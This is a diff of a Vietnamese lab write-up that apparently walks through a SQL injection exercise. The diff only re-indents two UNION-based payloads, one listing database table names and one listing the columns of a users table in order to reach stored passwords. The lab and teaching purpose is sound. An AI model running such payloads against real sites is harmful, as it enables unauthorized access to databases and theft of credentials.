@@ -18,7 +18,7 @@ Trong bài nó yêu cầu lấy dữ liệu không thuộc ORACLE nên mở chea
 
 Thử với cái payload đầu kiểu
 
-   'UNION SELECT table_name, NULL FROM information_schema.tables-- -
+     'UNION SELECT table_name, NULL FROM information_schema.tables-- -
 
    ![image](https://github.com/user-attachments/assets/05daffab-8a3f-4383-ba3e-a06491c66288)
 
@@ -36,7 +36,7 @@ users_pvyfau tìm ra được bởi do nó khác với các cái user còn lại
 
 Sử dụng payload sau để check mật khẩu
  
-   'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_pvyfau'-- -
+     'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_pvyfau'-- -
 
 ![image](https://github.com/user-attachments/assets/90d3e7f9-ebfd-4372-bfca-05fd980b8895)
 
